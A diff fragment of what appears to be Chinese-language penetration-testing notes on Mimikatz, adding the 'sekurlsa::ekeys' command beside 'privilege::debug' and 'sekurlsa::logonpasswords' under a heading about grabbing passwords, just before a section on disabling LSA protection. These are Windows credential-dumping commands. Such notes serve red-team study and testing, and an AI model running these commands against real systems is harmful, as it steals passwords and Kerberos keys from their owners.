@@ -67,6 +67,9 @@ privilege::debug
 
 #抓取密码
 sekurlsa::logonpasswords
+
+# ekeys
+sekurlsa::ekeys
 ```
 
 # 禁用LSA保护
